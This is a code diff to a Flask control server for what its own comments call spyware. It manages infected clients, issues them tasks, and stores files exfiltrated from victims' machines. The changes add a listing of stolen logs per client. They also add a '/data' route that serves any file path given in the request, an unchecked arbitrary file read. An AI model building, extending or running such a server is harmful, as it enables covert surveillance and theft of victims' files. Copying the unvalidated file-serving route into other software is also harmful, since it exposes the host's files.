@@ -28,8 +28,10 @@ class Client:
         self.key: bytes = data[5:21]
         self.current_task = None
 
+        # runtime temp data retrieved from the client
         self.file_listing = None
         self.file_listing_directory = None
+        self.stream_on = False
 
     def complete_task(self, data):
 
@@ -128,6 +130,7 @@ def file_listing_callback(client_id, data):
 
     return 1
 
+
 def file_upload_callback(client_id, data, file_path):
     file_dir, file_name = file_path.split(',')
     path = os.path.join(EXFIL_DATA_PATH, client_id, file_dir)
@@ -138,6 +141,7 @@ def file_upload_callback(client_id, data, file_path):
         f.write(data)
 
     return 1
+
 
 # Placeholder for supported commands, to be updated when Spyware features fully implemented
 file_listing_commands = [
@@ -157,7 +161,9 @@ sidebar_commands = [
 sidebar_commands = {
     command.command_code: command for command in sidebar_commands}
 
-get_file_command = Command(0x0, "Download File", callback_function=file_upload_callback)
+get_file_command = Command(
+    0x0, "Download File", callback_function=file_upload_callback)
+
 
 def add_new_client(client_id, data, addr):
     print_debug(f'new client id: {client_id}')
@@ -169,6 +175,22 @@ def add_new_client(client_id, data, addr):
     clients[client_id] = new_client
 
     return new_client
+
+
+def generate_database_listing(client_id):
+    client_data_path = os.path.join(EXFIL_DATA_PATH, client_id)
+    database_listing = []
+    if os.path.exists(client_data_path):
+        for subdir in os.listdir(client_data_path):
+            subdir_full = os.path.join(client_data_path, subdir)
+            for log in os.listdir(subdir_full):
+                log_full_path = os.path.join(subdir_full, log)
+                log_full_path = os.path.abspath(log_full_path)
+                log_stats = os.stat(log_full_path)
+                entry = (subdir, log, log_stats.st_size, log_full_path)
+                database_listing.append(entry)
+
+        return database_listing
 
 # tentatively receive data from exfil
 
@@ -229,6 +251,11 @@ def control_centre():
     return render_template('index.html', clients=clients.items(), task_count=task_count)
 
 
+@app.route('/data', methods=['GET'])
+def download_log():
+    log_path = request.args.get('log')
+    return send_file(log_path)
+
 # used to control individual clients
 @app.route('/client', methods=['GET'])
 def control_client():
@@ -262,4 +289,6 @@ def control_client():
         task = Task(command, args=command_args)
         client.current_task = task
 
-    return render_template('client.html', client_id=client_id, ip_address = client.addr, file_listing_commands=file_listing_commands, sidebar_commands=sidebar_commands.items(), file_listing=client.file_listing, file_listing_directory = client.file_listing_directory)
+    database_listing = generate_database_listing(client_id)
+
+    return render_template('client.html', client_id=client_id, ip_address=client.addr, file_listing_commands=file_listing_commands, sidebar_commands=sidebar_commands.items(), file_listing=client.file_listing, file_listing_directory=client.file_listing_directory, database_listing=database_listing)
